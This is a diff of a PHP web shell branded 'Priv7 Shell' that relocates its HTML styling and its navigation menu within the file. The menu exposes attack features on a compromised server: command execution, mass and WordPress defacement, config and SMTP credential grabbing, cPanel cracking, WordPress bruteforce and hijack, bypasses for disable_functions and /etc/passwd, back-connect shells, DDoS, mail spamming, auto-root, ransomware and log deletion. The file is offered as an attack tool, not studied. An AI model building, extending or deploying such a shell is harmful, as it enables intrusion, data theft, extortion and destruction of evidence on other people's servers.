@@ -234,146 +234,6 @@ if (!file_exists('.htaccess')) {
   fwrite($ht, $isian);
   fclose($ht);
 }
-?>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="robots" content="none,noarchive">
-<meta name="author" content="Mr.xBarakuda">
-<link rel="icon" href="https://ia800901.us.archive.org/20/items/logo_DRF_icon/logo_DRF_icon.ico">
-<title>Priv7 Shell</title>
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-:root{--bg:#0a0e17;--bg2:#111827;--bg3:#1a2234;--border:#2563eb33;--accent:#3b82f6;--accent2:#06b6d4;--gold:#f6d155;--red:#ef4444;--green:#22c55e;--text:#e2e8f0;--text2:#94a3b8;--radius:8px}
-body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,-apple-system,sans-serif;font-size:14px;line-height:1.5}
-a{color:var(--text);text-decoration:none;transition:color .2s}a:hover{color:var(--gold);text-decoration:underline}
-::-webkit-scrollbar{width:6px}::-webkit-scrollbar-track{background:var(--bg2)}::-webkit-scrollbar-thumb{background:var(--accent);border-radius:3px}
-.topbar{background:var(--bg2);border-bottom:1px solid var(--border);padding:10px 16px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;position:sticky;top:0;z-index:100;backdrop-filter:blur(12px)}
-.topbar .logo{font-size:18px;font-weight:700;letter-spacing:1px;background:linear-gradient(135deg,var(--accent),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
-.topbar .sysinfo{font-size:12px;color:var(--text2);display:flex;flex-wrap:wrap;gap:12px}
-.nav{background:var(--bg2);border-bottom:1px solid var(--border);padding:6px 12px;display:flex;flex-wrap:wrap;gap:4px;overflow-x:auto;position:sticky;top:48px;z-index:99}
-.nav a{padding:6px 12px;font-size:12px;font-weight:600;border:1px solid transparent;border-radius:var(--radius);color:var(--accent2);white-space:nowrap;transition:all .2s;letter-spacing:.5px}
-.nav a:hover,.nav a.active{background:rgba(59,130,246,.15);border-color:var(--accent);color:var(--gold)}
-.content{max-width:1200px;margin:0 auto;padding:16px}
-.card{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);padding:16px;margin-bottom:16px}
-.card h3{font-size:16px;font-weight:700;margin-bottom:12px;color:var(--accent);border-bottom:1px solid var(--border);padding-bottom:8px}
-.sinfo-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:8px;margin-bottom:12px}
-.sinfo-grid .item{display:flex;gap:6px;font-size:13px}.sinfo-grid .item .label{color:var(--text2);min-width:100px}.sinfo-grid .item .val{color:var(--accent2);word-break:break-all}
-.breadcrumb{padding:8px 12px;font-size:13px;color:var(--text2);word-break:break-all}.breadcrumb a{color:var(--accent2);margin:0 2px}
-.tbl{width:100%;border-collapse:collapse;font-size:13px}
-.tbl th{background:var(--bg3);padding:8px 12px;text-align:left;font-weight:600;color:var(--text);border-bottom:2px solid var(--accent)}
-.tbl td{padding:6px 12px;border-bottom:1px solid var(--border)}.tbl tr:hover td{background:rgba(59,130,246,.06)}
-input[type=text],input[type=password],input[type=number],input[type=email],select,textarea{background:var(--bg3);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);padding:8px 12px;font-size:13px;font-family:inherit;outline:none;transition:border-color .2s;width:100%;max-width:500px}
-input:focus,textarea:focus,select:focus{border-color:var(--accent)}
-textarea{width:100%;height:300px;resize:vertical;font-family:monospace;font-size:12px}
-input[type=submit],button{background:var(--accent);color:#fff;border:none;border-radius:var(--radius);padding:8px 20px;font-size:13px;font-weight:600;cursor:pointer;transition:all .2s}
-input[type=submit]:hover,button:hover{background:var(--accent2);transform:translateY(-1px)}
-.form-group{margin-bottom:12px}.form-group label{display:block;font-size:13px;color:var(--text2);margin-bottom:4px}
-.fm-actions a{margin:0 4px;color:var(--accent2);font-size:12px}.fm-actions a:hover{color:var(--gold)}
-.table_home{width:100%;border-collapse:collapse;font-size:13px}.th_home{background:var(--bg3);padding:8px 12px;text-align:center;font-weight:600;color:var(--text);border:1px solid var(--border)}
-.td_home{padding:6px 12px;border:1px solid var(--border);font-size:13px}.td_home img{vertical-align:middle;margin-right:4px}
-.inputz{background:var(--bg3);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);padding:8px 12px;font-size:13px;margin:4px 0;width:100%;max-width:500px;outline:none}
-.inputzbut{background:var(--accent);color:#fff;border:none;border-radius:var(--radius);padding:8px 20px;font-size:13px;font-weight:600;cursor:pointer;transition:all .2s;margin:4px}
-.inputzbut:hover{background:var(--accent2)}
-.text{background:var(--bg3);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);padding:8px 12px;font-size:13px;margin:4px 0}
-.select{background:var(--bg3);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);padding:8px 12px;font-size:13px}
-.mybox{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);padding:16px;margin-bottom:16px}
-.phpinfo{padding:16px;overflow-x:auto;font-size:12px}
-.phpinfo table{width:100%;border-collapse:collapse}.phpinfo td,.phpinfo th{padding:4px 8px;border:1px solid var(--border);font-size:12px}
-.kedip{color:var(--accent2);font-family:monospace;font-size:14px;line-height:1.2;white-space:pre}
-@media(max-width:768px){.sinfo-grid{grid-template-columns:1fr}.topbar{flex-direction:column;align-items:flex-start}.tbl{font-size:11px}.tbl th,.tbl td{padding:4px 6px}.nav a{padding:4px 8px;font-size:11px}input[type=text],select,textarea,.inputz{max-width:100%}}
-</style>
-</head>
-<body>
-<?php
-
-  echo '<div class="topbar">';
-  echo '<div class="logo">Priv7 Shell</div>';
-  echo '<div class="sysinfo">';
-  echo '<span>System: <b style="color:var(--accent2)">' . $kernel . '</b></span>';
-  echo '<span>Host: <b style="color:var(--accent2)">' . $_SERVER['SERVER_NAME'] . '</b></span>';
-  echo '<span>PHP: <b style="color:var(--accent2)">' . phpversion() . '</b></span>';
-  echo '<span>User: <b style="color:var(--accent2)">' . $user . ' (' . $uid . ')</b></span>';
-  echo '<span>IP: <b style="color:var(--accent2)">' . $_SERVER['REMOTE_ADDR'] . '</b></span>';
-  echo '<span>HDD: <b style="color:var(--accent2)">' . $used . ' / ' . $total . '</b></span>';
-  echo '</div></div>';
-
-  echo '<div class="nav">';
-  echo '  <a href="?">Home</a>';
-  echo "  <a href='?dir=$dir&do=upload'>Upload</a>";
-  echo "  <a href='?dir=$dir&do=command'>Command</a>";
-  echo "  <a href='?dir=$dir&do=mass_deface'>Mass Deface</a>";
-  echo "  <a href='?dir=$dir&do=xaivhost'>Vhost Config</a>";
-  echo "  <a href='?dir=$dir&do=configv2'>Config Grab</a>";
-  echo "  <a href='?dir=$dir&do=jumping'>Jumping</a>";
-  echo "  <a href='?dir=$dir&do=cpcrack'>CPanel Crack</a>";
-  echo "  <a href='?dir=$dir&do=smtp'>SMTP Grab</a>";
-  echo "  <a href='?dir=$dir&do=zoneh'>Zone-H</a>";
-  echo "  <a href='?dir=$dir&do=base64pict'>Base64 Img</a>";
-  echo "  <a href='?dir=$dir&do=spam_mail'>Mail Spammer</a>";
-  echo "  <a href='?dir=$dir&do=fake_root'>Fake Root</a>";
-  echo "  <a href='?dir=$dir&do=auto_edit_user'>Auto Edit User</a>";
-  echo "  <a href='?dir=$dir&do=wp_timthumb'>WP TimThumb</a>";
-  echo "  <a href='?dir=$dir&do=auto_wp'>WP Auto Edit</a>";
-  echo "  <a href='?dir=$dir&do=auto_dwp'>WP Auto Deface</a>";
-  echo "  <a href='?dir=$dir&do=auto_dwp2'>WP Deface V2</a>";
-  echo "  <a href='?dir=$dir&do=wpbf'>WP Bruteforce</a>";
-  echo "  <a href='?dir=$dir&do=hijack_wp'>WP Hijack</a>";
-  echo "  <a href='?dir=$dir&do=endecode'>EN/DEcoder</a>";
-  echo "  <a href='?dir=$dir&do=symlink'>Symlink</a>";
-  echo "  <a href='?dir=$dir&do=symconfv2'>Symlink V2</a>";
-  echo "  <a href='?dir=$dir&do=sympy'>Symlink Py</a>";
-  echo "  <a href='?dir=$dir&bypass=disablefunc'>Bypass DisableFunc</a>";
-  echo "  <a href='?dir=$dir&bypass=vhosts'>Bypass Vhost</a>";
-  echo "  <a href='?dir=$dir&bypass=etcpass'>Bypass /etc/passwd</a>";
-  echo "  <a href='?dir=$dir&bypass=cloudfl'>Bypass CloudFlare</a>";
-  echo "  <a href='?weevely'>Weevely</a>";
-  echo "  <a href='?dir=$dir&do=krdp_shell'>K-RDP Shell</a>";
-  echo "  <a href='?dir=$dir&do=ddos'>DDoS</a>";
-  echo "  <a href='?dir=$dir&do=domains'>Domains</a>";
-  echo "  <a href='?dir=$dir&do=ports'>Port Scanner</a>";
-  echo "  <a href='?dir=$dir&do=adminer'>Adminer</a>";
-  echo "  <a href='?dir=$dir&do=csrf'>CSRF</a>";
-  echo "  <a href='?dir=$dir&do=bctools'>Back Connect</a>";
-  echo "  <a href='?dir=$dir&do=hashgen'>Hash Gen</a>";
-  echo "  <a href='?dir=$dir&do=hashid'>Hash ID</a>";
-  echo "  <a href='?dir=$dir&do=honey'>Honeypot</a>";
-  echo "  <a href='?dir=$dir&do=zip_menu'>Zip Menu</a>";
-  echo "  <a href='?dir=$dir&do=infosec'>Server Info</a>";
-  echo "  <a href='?dir=$dir&do=phpinfo'>PHP Info</a>";
-  echo "  <a href='?dir=$dir&whmcs=killer'>WHMCS Killer</a>";
-  echo "  <a href='?dir=$dir&do=whmcsdeco'>WHMCS Decoder</a>";
-  echo "  <a href='?dir=$dir&do=dbdump'>DB Dump</a>";
-  echo "  <a href='?dir=$dir&do=vb_ngindex'>VB Index</a>";
-  echo "  <a href='?dir=$dir&do=reverse_ip'>Reverse IP</a>";
-  echo "  <a href='?dir=$dir&do=loghunter'>Log Hunter</a>";
-  echo "  <a href='?dir=$dir&do=cgitelnet'>CGI Telnet</a>";
-  echo "  <a href='?dir=$dir&do=kudascan'>Shell Scanner v1.1</a>";
-  echo "  <a href='?dir=$dir&do=shellscan'>Shell Scanner</a>";
-  echo "  <a href='?dir=$dir&do=drupalex'>Drupal Exploit</a>";
-  echo "  <a href='?dir=$dir&do=delogs'>Delete Logs</a>";
-  echo "  <a href='?dir=$dir&do=about'>About</a>";
-  echo "  <a href='?dir=$dir&do=w00t'>Auto Root</a>";
-  echo "  <a href='?dir=$dir&do=ransomware'>Ransomware</a>";
-  echo "  <a href='?dir=$dir&do=masschm'>Chmod Mass</a>";
-  echo "  <a href='?dir=$dir&do=r00t'>Simple Root</a>";
-  echo "  <a href='?dir=$dir&do=contact'>Contact</a>";
-
-  echo '</div>';
-
-  echo '<div class="breadcrumb">CWD: ';
-  foreach ($scdir as $c_dir => $cdir) {
-    echo '<a href="?dir=';
-    for ($i = 0; $i <= $c_dir; $i++) {
-      echo $scdir[$i];
-      if ($i != $c_dir) echo "/";
-    }
-    echo '">' . $cdir . '</a>/';
-  }
-  echo '&nbsp;&nbsp;[ ' . w($dir, perms($dir)) . ' ]</div>';
-  echo '<div class="content">';
   function w($dir, $perm) {
     if (!is_writable($dir)) {
       return "<font color=red>" . $perm . "</font>";
@@ -524,6 +384,146 @@ input[type=submit]:hover,button:hover{background:var(--accent2);transform:transl
     $group = $gid['name'];
     $gid = $gid['gid'];
   }
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="none,noarchive">
+<meta name="author" content="Mr.xBarakuda">
+<link rel="icon" href="https://ia800901.us.archive.org/20/items/logo_DRF_icon/logo_DRF_icon.ico">
+<title>Priv7 Shell</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#0a0e17;--bg2:#111827;--bg3:#1a2234;--border:#2563eb33;--accent:#3b82f6;--accent2:#06b6d4;--gold:#f6d155;--red:#ef4444;--green:#22c55e;--text:#e2e8f0;--text2:#94a3b8;--radius:8px}
+body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,-apple-system,sans-serif;font-size:14px;line-height:1.5}
+a{color:var(--text);text-decoration:none;transition:color .2s}a:hover{color:var(--gold);text-decoration:underline}
+::-webkit-scrollbar{width:6px}::-webkit-scrollbar-track{background:var(--bg2)}::-webkit-scrollbar-thumb{background:var(--accent);border-radius:3px}
+.topbar{background:var(--bg2);border-bottom:1px solid var(--border);padding:10px 16px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;position:sticky;top:0;z-index:100;backdrop-filter:blur(12px)}
+.topbar .logo{font-size:18px;font-weight:700;letter-spacing:1px;background:linear-gradient(135deg,var(--accent),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.topbar .sysinfo{font-size:12px;color:var(--text2);display:flex;flex-wrap:wrap;gap:12px}
+.nav{background:var(--bg2);border-bottom:1px solid var(--border);padding:6px 12px;display:flex;flex-wrap:wrap;gap:4px;overflow-x:auto;position:sticky;top:48px;z-index:99}
+.nav a{padding:6px 12px;font-size:12px;font-weight:600;border:1px solid transparent;border-radius:var(--radius);color:var(--accent2);white-space:nowrap;transition:all .2s;letter-spacing:.5px}
+.nav a:hover,.nav a.active{background:rgba(59,130,246,.15);border-color:var(--accent);color:var(--gold)}
+.content{max-width:1200px;margin:0 auto;padding:16px}
+.card{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);padding:16px;margin-bottom:16px}
+.card h3{font-size:16px;font-weight:700;margin-bottom:12px;color:var(--accent);border-bottom:1px solid var(--border);padding-bottom:8px}
+.sinfo-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:8px;margin-bottom:12px}
+.sinfo-grid .item{display:flex;gap:6px;font-size:13px}.sinfo-grid .item .label{color:var(--text2);min-width:100px}.sinfo-grid .item .val{color:var(--accent2);word-break:break-all}
+.breadcrumb{padding:8px 12px;font-size:13px;color:var(--text2);word-break:break-all}.breadcrumb a{color:var(--accent2);margin:0 2px}
+.tbl{width:100%;border-collapse:collapse;font-size:13px}
+.tbl th{background:var(--bg3);padding:8px 12px;text-align:left;font-weight:600;color:var(--text);border-bottom:2px solid var(--accent)}
+.tbl td{padding:6px 12px;border-bottom:1px solid var(--border)}.tbl tr:hover td{background:rgba(59,130,246,.06)}
+input[type=text],input[type=password],input[type=number],input[type=email],select,textarea{background:var(--bg3);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);padding:8px 12px;font-size:13px;font-family:inherit;outline:none;transition:border-color .2s;width:100%;max-width:500px}
+input:focus,textarea:focus,select:focus{border-color:var(--accent)}
+textarea{width:100%;height:300px;resize:vertical;font-family:monospace;font-size:12px}
+input[type=submit],button{background:var(--accent);color:#fff;border:none;border-radius:var(--radius);padding:8px 20px;font-size:13px;font-weight:600;cursor:pointer;transition:all .2s}
+input[type=submit]:hover,button:hover{background:var(--accent2);transform:translateY(-1px)}
+.form-group{margin-bottom:12px}.form-group label{display:block;font-size:13px;color:var(--text2);margin-bottom:4px}
+.fm-actions a{margin:0 4px;color:var(--accent2);font-size:12px}.fm-actions a:hover{color:var(--gold)}
+.table_home{width:100%;border-collapse:collapse;font-size:13px}.th_home{background:var(--bg3);padding:8px 12px;text-align:center;font-weight:600;color:var(--text);border:1px solid var(--border)}
+.td_home{padding:6px 12px;border:1px solid var(--border);font-size:13px}.td_home img{vertical-align:middle;margin-right:4px}
+.inputz{background:var(--bg3);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);padding:8px 12px;font-size:13px;margin:4px 0;width:100%;max-width:500px;outline:none}
+.inputzbut{background:var(--accent);color:#fff;border:none;border-radius:var(--radius);padding:8px 20px;font-size:13px;font-weight:600;cursor:pointer;transition:all .2s;margin:4px}
+.inputzbut:hover{background:var(--accent2)}
+.text{background:var(--bg3);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);padding:8px 12px;font-size:13px;margin:4px 0}
+.select{background:var(--bg3);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);padding:8px 12px;font-size:13px}
+.mybox{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);padding:16px;margin-bottom:16px}
+.phpinfo{padding:16px;overflow-x:auto;font-size:12px}
+.phpinfo table{width:100%;border-collapse:collapse}.phpinfo td,.phpinfo th{padding:4px 8px;border:1px solid var(--border);font-size:12px}
+.kedip{color:var(--accent2);font-family:monospace;font-size:14px;line-height:1.2;white-space:pre}
+@media(max-width:768px){.sinfo-grid{grid-template-columns:1fr}.topbar{flex-direction:column;align-items:flex-start}.tbl{font-size:11px}.tbl th,.tbl td{padding:4px 6px}.nav a{padding:4px 8px;font-size:11px}input[type=text],select,textarea,.inputz{max-width:100%}}
+</style>
+</head>
+<body>
+<?php
+
+  echo '<div class="topbar">';
+  echo '<div class="logo">Priv7 Shell</div>';
+  echo '<div class="sysinfo">';
+  echo '<span>System: <b style="color:var(--accent2)">' . $kernel . '</b></span>';
+  echo '<span>Host: <b style="color:var(--accent2)">' . $_SERVER['SERVER_NAME'] . '</b></span>';
+  echo '<span>PHP: <b style="color:var(--accent2)">' . phpversion() . '</b></span>';
+  echo '<span>User: <b style="color:var(--accent2)">' . $user . ' (' . $uid . ')</b></span>';
+  echo '<span>IP: <b style="color:var(--accent2)">' . $_SERVER['REMOTE_ADDR'] . '</b></span>';
+  echo '<span>HDD: <b style="color:var(--accent2)">' . $used . ' / ' . $total . '</b></span>';
+  echo '</div></div>';
+
+  echo '<div class="nav">';
+  echo '  <a href="?">Home</a>';
+  echo "  <a href='?dir=$dir&do=upload'>Upload</a>";
+  echo "  <a href='?dir=$dir&do=command'>Command</a>";
+  echo "  <a href='?dir=$dir&do=mass_deface'>Mass Deface</a>";
+  echo "  <a href='?dir=$dir&do=xaivhost'>Vhost Config</a>";
+  echo "  <a href='?dir=$dir&do=configv2'>Config Grab</a>";
+  echo "  <a href='?dir=$dir&do=jumping'>Jumping</a>";
+  echo "  <a href='?dir=$dir&do=cpcrack'>CPanel Crack</a>";
+  echo "  <a href='?dir=$dir&do=smtp'>SMTP Grab</a>";
+  echo "  <a href='?dir=$dir&do=zoneh'>Zone-H</a>";
+  echo "  <a href='?dir=$dir&do=base64pict'>Base64 Img</a>";
+  echo "  <a href='?dir=$dir&do=spam_mail'>Mail Spammer</a>";
+  echo "  <a href='?dir=$dir&do=fake_root'>Fake Root</a>";
+  echo "  <a href='?dir=$dir&do=auto_edit_user'>Auto Edit User</a>";
+  echo "  <a href='?dir=$dir&do=wp_timthumb'>WP TimThumb</a>";
+  echo "  <a href='?dir=$dir&do=auto_wp'>WP Auto Edit</a>";
+  echo "  <a href='?dir=$dir&do=auto_dwp'>WP Auto Deface</a>";
+  echo "  <a href='?dir=$dir&do=auto_dwp2'>WP Deface V2</a>";
+  echo "  <a href='?dir=$dir&do=wpbf'>WP Bruteforce</a>";
+  echo "  <a href='?dir=$dir&do=hijack_wp'>WP Hijack</a>";
+  echo "  <a href='?dir=$dir&do=endecode'>EN/DEcoder</a>";
+  echo "  <a href='?dir=$dir&do=symlink'>Symlink</a>";
+  echo "  <a href='?dir=$dir&do=symconfv2'>Symlink V2</a>";
+  echo "  <a href='?dir=$dir&do=sympy'>Symlink Py</a>";
+  echo "  <a href='?dir=$dir&bypass=disablefunc'>Bypass DisableFunc</a>";
+  echo "  <a href='?dir=$dir&bypass=vhosts'>Bypass Vhost</a>";
+  echo "  <a href='?dir=$dir&bypass=etcpass'>Bypass /etc/passwd</a>";
+  echo "  <a href='?dir=$dir&bypass=cloudfl'>Bypass CloudFlare</a>";
+  echo "  <a href='?weevely'>Weevely</a>";
+  echo "  <a href='?dir=$dir&do=krdp_shell'>K-RDP Shell</a>";
+  echo "  <a href='?dir=$dir&do=ddos'>DDoS</a>";
+  echo "  <a href='?dir=$dir&do=domains'>Domains</a>";
+  echo "  <a href='?dir=$dir&do=ports'>Port Scanner</a>";
+  echo "  <a href='?dir=$dir&do=adminer'>Adminer</a>";
+  echo "  <a href='?dir=$dir&do=csrf'>CSRF</a>";
+  echo "  <a href='?dir=$dir&do=bctools'>Back Connect</a>";
+  echo "  <a href='?dir=$dir&do=hashgen'>Hash Gen</a>";
+  echo "  <a href='?dir=$dir&do=hashid'>Hash ID</a>";
+  echo "  <a href='?dir=$dir&do=honey'>Honeypot</a>";
+  echo "  <a href='?dir=$dir&do=zip_menu'>Zip Menu</a>";
+  echo "  <a href='?dir=$dir&do=infosec'>Server Info</a>";
+  echo "  <a href='?dir=$dir&do=phpinfo'>PHP Info</a>";
+  echo "  <a href='?dir=$dir&whmcs=killer'>WHMCS Killer</a>";
+  echo "  <a href='?dir=$dir&do=whmcsdeco'>WHMCS Decoder</a>";
+  echo "  <a href='?dir=$dir&do=dbdump'>DB Dump</a>";
+  echo "  <a href='?dir=$dir&do=vb_ngindex'>VB Index</a>";
+  echo "  <a href='?dir=$dir&do=reverse_ip'>Reverse IP</a>";
+  echo "  <a href='?dir=$dir&do=loghunter'>Log Hunter</a>";
+  echo "  <a href='?dir=$dir&do=cgitelnet'>CGI Telnet</a>";
+  echo "  <a href='?dir=$dir&do=kudascan'>Shell Scanner v1.1</a>";
+  echo "  <a href='?dir=$dir&do=shellscan'>Shell Scanner</a>";
+  echo "  <a href='?dir=$dir&do=drupalex'>Drupal Exploit</a>";
+  echo "  <a href='?dir=$dir&do=delogs'>Delete Logs</a>";
+  echo "  <a href='?dir=$dir&do=about'>About</a>";
+  echo "  <a href='?dir=$dir&do=w00t'>Auto Root</a>";
+  echo "  <a href='?dir=$dir&do=ransomware'>Ransomware</a>";
+  echo "  <a href='?dir=$dir&do=masschm'>Chmod Mass</a>";
+  echo "  <a href='?dir=$dir&do=r00t'>Simple Root</a>";
+  echo "  <a href='?dir=$dir&do=contact'>Contact</a>";
+
+  echo '</div>';
+
+  echo '<div class="breadcrumb">CWD: ';
+  foreach ($scdir as $c_dir => $cdir) {
+    echo '<a href="?dir=';
+    for ($i = 0; $i <= $c_dir; $i++) {
+      echo $scdir[$i];
+      if ($i != $c_dir) echo "/";
+    }
+    echo '">' . $cdir . '</a>/';
+  }
+  echo '&nbsp;&nbsp;[ ' . w($dir, perms($dir)) . ' ]</div>';
+  echo '<div class="content">';
   function success($for, $var1) {
   $domain = $_SERVER['HTTP_HOST'];
   $script = $_SERVER['SCRIPT_NAME'];
